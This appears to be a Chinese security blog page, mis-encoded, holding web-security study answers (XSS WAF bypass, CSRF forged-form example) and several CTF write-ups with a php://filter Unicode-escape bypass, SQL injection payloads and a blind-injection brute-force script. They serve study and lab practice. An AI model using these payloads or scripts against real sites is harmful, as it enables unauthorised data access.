<p>Cookieçš„HTTPOnlyå±æ€§ï¼šç¡®ä¿cookieåªèƒ½é€šè¿‡Webè¯·æ±‚ä¼ è¾“ï¼Œè€Œä¸èƒ½ç”¨JavaScriptæ¥è¯»å–è®¿é—®ã€‚åŸæœ¬å¯ç”¨çš„document.cookieæ–¹æ³•çš„JSè„šæœ¬åœ¨æ‰“å¼€HTTPOnlyåæ— æ³•è¯»å–cookieï¼Œcookieåªåœ¨è¯·æ±‚ä¸­ä¼ è¾“ã€‚</p>
</blockquote>
<p>5.ç®€è¿°æœ¬è§†é¢‘æåˆ°çš„xssç»•è¿‡webé˜²ç«å¢™çš„æ–¹æ¡ˆï¼ˆ5åˆ†ï¼‰</p>
<blockquote>
<p>åˆ©ç”¨æµè§ˆå™¨ä¸WAFå¯¹htmlè§£ææ–¹å¼ä¸åŒçš„ç‰¹ç‚¹ã€‚&lt;script/xss src=xxxxxx&gt;åœ¨æµè§ˆå™¨ä¸­ï¼Œ/ä¼šè¢«è§£æä¸º%20ï¼Œè€ŒWAFä»…ä»…è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªscript/xssæ ·å¼ã€‚è¿™æ ·å°±ç»•è¿‡äº†WAFï¼Œè€Œæµè§ˆå™¨ä¸­è¯¥æ ‡ç­¾å¾—ä»¥æ‰§è¡Œã€‚</p>
</blockquote>
<p>6.å†…å®¹å—…æ¢æ˜¯ä»€ä¹ˆï¼Ÿä¸»è¦æœ‰å“ªäº›ç±»å‹ï¼Ÿè¯·åˆ†åˆ«ä¸¾ä¾‹ï¼Œä¸»è¦ç”¨é€”æ˜¯ä»€ä¹ˆï¼Ÿåœ¨ä»€ä¹ˆæƒ…å†µä¸‹å¯ä»¥åˆ©ç”¨è¿™äº›æ¼æ´ï¼Ÿä¸ºä»€ä¹ˆfacebookç­‰ç½‘ç«™éœ€è¦ä½¿ç”¨ä¸åŒçš„åŸŸåæ¥å­˜å‚¨å›¾ç‰‡ï¼Ÿï¼ˆ5åˆ†ï¼‰</p>
<blockquote>
<p><strong>å†…å®¹å—…æ¢ï¼ˆContent Sniffingï¼‰</strong></p>
<p>æµè§ˆå™¨åœ¨æ˜¾ç¤ºå“åº”å›æ¥çš„è¯·æ±‚æ–‡ä»¶æˆ–ç½‘é¡µæ—¶ï¼Œè‹¥ä¸çŸ¥é“è¯¥æ–‡ä»¶æˆ–ç½‘é¡µçš„å…·ä½“æ–‡ä»¶å†…å®¹ï¼ˆContent-Typeï¼‰ï¼Œä¼šå¯åŠ¨å†…å®¹å—…æ¢æœºåˆ¶ã€‚å¦‚ï¼š<strong>MIME Sniffing</strong>ï¼Œå®ƒçš„åŸç†æ˜¯æµè§ˆå™¨å›æ˜¾è‡ªåŠ¨æ¢æµ‹æœªçŸ¥æ ¼å¼çš„è¯·æ±‚æ–‡ä»¶ç±»å‹ã€‚å¦ï¼š<strong>Encoding Sniffing</strong>ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨æ£€æµ‹æœªçŸ¥æ ¼å¼æ–‡ä»¶çš„ç¼–ç ç±»å‹ã€‚é€šè¿‡å¯¹å†…å®¹ç¼–ç æ ¼å¼çš„ä¸€ä¸€åŒ¹é…è¿›è¡Œå—…æ¢ï¼Œååœ¨æµè§ˆå™¨ä¸­è¿›è¡Œç›¸åº”çš„è§£ææ˜¾ç¤ºã€‚</p>
<p>åœ¨è¯·æ±‚å“åº”ä¸å…·å¤‡æ°å½“çš„MIMEç±»å‹æ—¶ï¼Œæµè§ˆå™¨çš„å…·ä½“æ£€æµ‹å’Œè§£ææœºåˆ¶å¯èƒ½ä¼šå¯¼è‡´å¯¹æ–‡ä»¶æˆ–å›¾ç‰‡çš„ä¸æ­£ç¡®è§£æï¼Œå¯¼è‡´æ­¤ç±»æ¼æ´çš„å‘ç”Ÿä¸åˆ©ç”¨ã€‚</p>
<p>Encoding Sniffingåˆ™åˆ©ç”¨æµè§ˆå™¨çš„è‡ªåŠ¨è¯†åˆ«è€ŒWAFéš¾ä»¥æ”¯æŒçš„ç‰¹ç‚¹(å¦‚ï¼šUTF-7ã€UTF-32)å®Œæˆæ”»å‡»ï¼Œä¹‹å‰åšè¿‡ä¸€ä¸ªxmlè½¬ç å®Œæˆæ”»å‡»çš„é¢˜ã€‚</p>
<p>facebookä½¿ç”¨å­åŸŸæ¥æ‰˜ç®¡å›¾ç‰‡ï¼Œé˜²æ­¢å› æ­¤ç±»æ¼æ´é€ æˆçš„xssæ”»å‡»ã€‚å³ä½¿æ”»å‡»å®Œæˆï¼Œè·å–åˆ°çš„ä¹Ÿå¯èƒ½ä»…ä»…æ˜¯å­åŸŸä¸‹çš„ä¸€ä¸ªcookieã€‚</p>
</blockquote>
<p>7.åŒæºç­–ç•¥æ˜¯ä»€ä¹ˆï¼Ÿé™åˆ¶æ˜¯ä»€ä¹ˆï¼Ÿæµè§ˆå™¨åœ¨é‡åˆ°å“ªä¸¤ç§æƒ…å†µçš„æ—¶å€™ä¼šç”¨åˆ°åŒæºç­–ç•¥ï¼Ÿå¦‚ä½•æ”¾æ¾SOPé™åˆ¶ï¼Ÿæ”¾æ¾SOPé™åˆ¶ä¼šå¯¹æµè§ˆå™¨æ’ä»¶å®‰å…¨é€ æˆæ€æ ·çš„ç ´åï¼Ÿ</p>
<blockquote>
<p><strong>åŒæºç­–ç•¥ï¼ˆSOPï¼‰</strong></p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy</a></p>
<p>Webå®‰å…¨çš„åŸºçŸ³ã€‚åŒæºç­–ç•¥ç›®çš„åœ¨äºé˜²æ­¢Webäº¤äº’é—´çš„ä¸å®‰å…¨è¡Œä¸ºã€‚åŒæºç­–ç•¥é™åˆ¶äº†è·¨åŸŸçš„èµ„æºè®¿é—®ã€‚</p>
<p><strong>é™åˆ¶</strong>ï¼šåè®®ã€ç«¯å£å·ã€ä¸»æœºï¼ˆåŸŸåï¼‰å¿…é¡»ç›¸åŒã€‚</p>
<p>ä¸åŒåŸŸä¹‹é—´æ˜¯é€šè¿‡XMLçš„HTTPè¯·æ±‚æ¥å®ç°äº¤äº’çš„ï¼Œä¹Ÿå°±æ˜¯AJAXè¯·æ±‚ã€‚SOPä¼šé™åˆ¶æ¥è‡ªiframeå’Œwindowså±æ€§çš„è·¨åŸŸè®¿é—®å’ŒAJAXè¯·æ±‚ï¼Ÿæ‰€ä»¥å½“æˆ‘ä»¬æ‰“å¼€ä¸€ä¸ªå¸¦æœ‰JSè„šæœ¬çš„æ–°çª—å£ï¼Œç”±äºSOPçš„å½±å“ï¼Œé‚£ä¹ˆå°±æ— æ³•å¯¹è¯¥çª—å£ä¸­çš„DOMå…ƒç´ å®ç°è®¿é—®ã€‚</p>
<p><strong>å¼±åŒ–SOP</strong>ï¼šå¯ä»¥é€šè¿‡è®¾ç½®ä¸åŒåŸŸä¹‹é—´çš„document.domainè„šæœ¬æ¥å®ç°ã€‚è¿™ç§æ–¹å¼å¯ä»¥è®©æœ¬è´¨ä¸Šä¸åŒæºçš„å­åŸŸå®ç°äº’ç›¸é€šä¿¡ä¸äº¤äº’ã€‚æˆ–è€…ï¼Œé€šè¿‡postMessageæ–¹æ³•å®ç°è·¨çª—å£é€šä¿¡ã€‚</p>
<p><strong>ç ´å</strong>ï¼šè·¨åŸŸè·¨çª—å£çš„ä¿¡æ¯éªŒè¯å¾ˆå°‘å­˜åœ¨ï¼Œè€ŒWebæ’ä»¶çš„å†…éƒ¨æ¶ˆæ¯å¤„ç†ç»å¸¸æ˜¯é”™è¯¯çš„ã€‚å¦‚ï¼šChromeçš„æ‹“å±•æ’ä»¶å°±å­˜åœ¨SOPç»•è¿‡æ¼æ´ã€‚Chromeçš„æ‹“å±•æ’ä»¶åœ¨æµè§ˆå™¨å‡†å¤‡çš„sandboxä¸­å—åˆ°äº†å¾ˆå¤šé™åˆ¶ï¼Œæ‰€ä»¥è¿™äº›æ’ä»¶å¸¸ä½¿ç”¨postMessageè¿›è¡Œè®¾è®¡ã€‚å½“æˆ‘ä»¬å‘æ’ä»¶å‘é€ä¿¡æ¯æ—¶ï¼Œå¯ä»¥é€šè¿‡è·¨çª—å£é€šä¿¡ç»•è¿‡SOPï¼Œå®é™…ä¸Šè¿™å·²ç»ç ´ç¯äº†æµè§ˆå™¨å‡†å¤‡çš„sandboxï¼Œæ˜¯ç”±SOPå¼±åŒ–å¯¼è‡´çš„æ¼æ´ã€‚</p>
</blockquote>
<p>8.csrfæ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•è®¾è®¡è§„é¿csrfï¼Ÿè§†é¢‘ä¸­æåˆ°çš„é”™è¯¯çš„csrfé…ç½®æ–¹æ³•æ˜¯ä»€ä¹ˆï¼Ÿ </p>
<blockquote>
<p><strong>CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰</strong></p>
<p>æ”»å‡»è€…æŒŸæŒå—å®³è€…å»è®¿é—®ç”±æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç«™ã€‚å¹¶ä»¥å—å®³è€…èº«ä»½æ‰§è¡Œè¯·æ±‚ã€æäº¤ç­‰æ¶æ„æ“ä½œã€‚</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;document.forms[0].submit()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;xxxx&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1000000&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;to&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1625&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„è¯·æ±‚ç›´æ¥å‘é€è‡³åç«¯ï¼Œè€Œåç«¯æ— æ³•åˆ†è¯·è¯·æ±‚æ˜¯å¦æ˜¯ä¼ªé€ çš„ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨CSRF-Tokenæ¥è§„é¿æ­¤ç±»æ”»å‡»ã€‚Tokenéšæœºç”Ÿæˆå¹¶åµŒå…¥è¡¨å•ä¸­ï¼ˆCSPâ€¦â€¦?å“¦ï¼Œä¸ä¸€æ ·â€¦â€¦</p>
<p>å¦‚ï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;xxxx&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è§†é¢‘ä¸­æåˆ°æœ‰Webåº”ç”¨é€šè¿‡åŠ è½½csrf.jsæ¥ç”Ÿæˆtokenï¼Œæ³„éœ²äº†tokençš„ç”Ÿæˆæ–¹å¼ï¼Œè¿™æ˜¯ä¸€ç§è‡ªæ¯çš„é˜²å¾¡æªæ–½ã€‚</p>
</blockquote>
<p>é™„åŠ é¢˜ï¼š5ã€6ä¸¤ç‚¹ä¸»è¦åˆ©ç”¨çš„æ˜¯ç”±äºæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯å¯¹åŒä¸€ä¿¡æ¯çš„å¤„ç†æ–¹å¼ä¸åŒé€ æˆçš„æ¼æ´ï¼Œä½ è¿˜èƒ½ä¸¾å‡ºç›¸ä¼¼çš„ä¾‹å­ä¹ˆï¼Ÿï¼ˆ1åˆ†ï¼‰</p>
<blockquote>
<p>â€¦â€¦â€¦â€¦</p>
</blockquote>
</div><div class="index-category-tag">Â Â <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2021-05-04Â Â <a class="commentCountImg" href="/2021/05/04/HarekazeCTF-2019-encode-and-encode/#comment-container"><span class="display-none-class">/2021/05/04/HarekazeCTF-2019-encode-and-encode/</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="eddfdc12cf892654035531ba4d4b6f6f">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>2 åˆ†é’Ÿ Â <i class="fas fa-pencil-alt">Â </i>0.3Â k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/05/04/HarekazeCTF-2019-encode-and-encode/">HarekazeCTF-2019-encode_and_encode</a></h1><div class="content"><h3><span id="harekazectf-2019-encode_and_encode">HarekazeCTF-2019-encode_and_encode</span></h3><p>ä¸Šæ¥å°±æ˜¯æºç â€¦â€¦ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $banword) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);<span class="comment">//æ¥å—postæ•°æ®</span></span><br><span class="line">$json = json_decode($body, <span class="literal">true</span>);<span class="comment">//jsonè§£å¯†ï¼Œæ•…bodyéœ€è¦ä¸ºåˆæ³•jsonå­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">&#x27;page&#x27;</span>])) &#123;<span class="comment">//bodyä¸­éœ€å«æœ‰pageå­—æ®µ</span></span><br><span class="line">  $page = $json[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  $content = file_get_contents($page);<span class="comment">//è¯»å–</span></span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;<span class="comment">//è¿‡æ»¤ä¼ å‚ï¼Œä¸€äº›ä¼ªåè®®ï¼Œflag</span></span><br><span class="line">    $content = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">&#x27;content&#x27;</span> =&gt; $content]);</span><br></pre></td></tr></table></figure>

<p>is_validè¿‡æ»¤äº†å¾ˆå¤šåè®®è¿˜æœ‰éå†ï¼Œéšä¾¿èµ·åè®®åå†éå†è¯»å–æ˜¯ä¸èƒ½ç”¨äº†â€¦â€¦</p>
<h3><span id="jsonè½¬ä¹‰">jsonè½¬ä¹‰</span></h3><p>jsonä¸ºæä¾›ä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„ä¼ è¾“ï¼Œæ”¯æŒäº†Unicodeï¼Œå¦‚ï¼šjson_encodeä¼šå°†ä¸­æ–‡è½¬æ¢ä¸ºunicodeç¼–ç </p>
<p>æ‰€ä»¥æ­¤å¤„ä½¿ç”¨Unicodeå³å¯ç»•è¿‡æ£€æŸ¥ã€‚</p>
<blockquote>
<p>{ â€œpageâ€ : â€œ\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067â€}</p>
</blockquote>
<p>flag{5c3db6bf-f5c9-4926-a809-ea7b4d23c37d}</p>
<p>è·å¾—flagâ€¦â€¦</p>
</div><div class="index-category-tag">Â Â <hr></div></article></div><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2021-05-04Â Â <a class="commentCountImg" href="/2021/05/04/NCTF2019-SQLi/#comment-container"><span class="display-none-class">/2021/05/04/NCTF2019-SQLi/</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="1e1f6c9629f0efd1691695f64fd87a0d">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>2 åˆ†é’Ÿ Â <i class="fas fa-pencil-alt">Â </i>0.3Â k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/05/04/NCTF2019-SQLi/">NCTF2019-SQLi</a></h1><div class="content"><h3><span id="nctf2019sqli">[NCTF2019]SQLi</span></h3><p>è¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•æ¡†æ³¨å…¥</p>
<blockquote>
<p>sqlquery : select * from users where username=â€™â€™ and passwd=â€™â€™</p>
</blockquote>
<p>æ ‡è¯†äº†æŸ¥è¯¢è¯­å¥ï¼Œæµ‹è¯•ï¼š</p>
<img src="/images/NCTF2019-SQLi/image-20210504174454423.png" alt="image-20210504174454423" style="zoom:80%;">

<p>è¿‡æ»¤äº†å¾ˆå¤šâ€¦â€¦</p>
<p>robots.txtä¸­æœ‰hintï¼Œæç¤ºäº†è¿‡æ»¤è§„åˆ™ä¸flagè·å–æ–¹å¼ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$black_list = <span class="string">&quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> $_POST[<span class="string">&#x27;passwd&#x27;</span>] === admin<span class="string">&#x27;s password,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Then you will get the flag;</span></span><br></pre></td></tr></table></figure>

<p>å¼•å·è¢«è¿‡æ»¤ï¼Œç”¨è½¬ä¹‰ï¼š</p>
<blockquote>
<p>username=a&amp;passwd=/**/||1;%00</p>
</blockquote>
<p>ç»“æœæ°¸çœŸï¼Œæ­¤æ—¶reså‡ºç°äº†å˜åŒ–ï¼š</p>
<img src="/images/NCTF2019-SQLi/image-20210504174832423.png" alt="image-20210504174832423" style="zoom:80%;">

<p>å®é™…ä¸Šï¼Œè¿™ä¸ªé¡µé¢å¹¶ä¸å­˜åœ¨â€¦â€¦</p>
<p>æˆ‘é™·å…¥äº†æ²‰æ€â€¦â€¦</p>
<h3><span id="regexpæ³¨å…¥">regexpæ³¨å…¥</span></h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8003">https://xz.aliyun.com/t/8003</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;\&amp;passwd&#x3D;&#x2F;**&#x2F;||username&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^admin&quot;;%00</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶ï¼Œæ³¨å…¥è¯­å¥ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;xxx&#39;&#x2F;**&#x2F;||username&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^admi&quot;;%00</span><br></pre></td></tr></table></figure>

<p>å¯¹usernameå­—æ®µè¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œä¸€ä¸ªä¸ªç§»ä½åŒ¹é…â€¦â€¦ï¼ˆåˆæ˜¯ç§»ä½åŒ¹é…â€¦â€¦</p>
<p>å†™è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://9424a242-edab-424f-b620-ceca992f2e55.node3.buuoj.cn/&quot;</span></span><br><span class="line">string=<span class="string">&quot;1234567890qwertyuiopasdfghjklzxcvbnm_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> string:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&#x27;/**/||passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#x27;</span>.<span class="built_in">format</span>(flag+s)+<span class="built_in">chr</span>(<span class="number">0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(pay)</span></span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;welcome.php&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="comment"># time.sleep(0.03)</span></span><br><span class="line">            flag += s</span><br><span class="line">            print(s)</span><br><span class="line">            print(flag)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/images/NCTF2019-SQLi/image-20210504182318273.png" alt="image-20210504182318273" style="zoom:80%;">

<p><img src="/images/NCTF2019-SQLi/image-20210504182429861.png" alt="image-20210504182429861"></p>
<p>å¾—åˆ°flagâ€¦â€¦</p>
<p>å®˜æ–¹wpï¼š</p>
<p><a target="_blank" rel="noopener" href="http://yulige.top/?p=752#SQLi500pt_11solvers">http://yulige.top/?p=752#SQLi500pt_11solvers</a></p>
</div><div class="index-category-tag">Â Â <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2021-05-04Â Â <a class="commentCountImg" href="/2021/05/04/SWPUCTF-2018-SimplePHP/#comment-container"><span class="display-none-class">/2021/05/04/SWPUCTF-2018-SimplePHP/</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="de32bed19a61fac890217ce31a9b1e49">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>6 åˆ†é’Ÿ Â <i class="fas fa-pencil-alt">Â </i>0.8Â k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/05/04/SWPUCTF-2018-SimplePHP/">SWPUCTF-2018-SimplePHP</a></h1><div class="content"><h3><span id="swpuctf-2018simplephp">[SWPUCTF 2018]SimplePHP</span></h3><p>è¿›å…¥é¢˜ç›®ï¼Œæœ‰ä¸€ä¸ªfileå‚æ•°ï¼Œå°è¯•ä¸€ä¸‹ä¼ªåè®®ï¼Œæ— æœâ€¦â€¦</p>
<p>ç»“æœç›´æ¥è¯»å¯ä»¥è¯»å‡ºæ¥</p>
<p>file.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>; </span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>); </span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>] ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>function.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 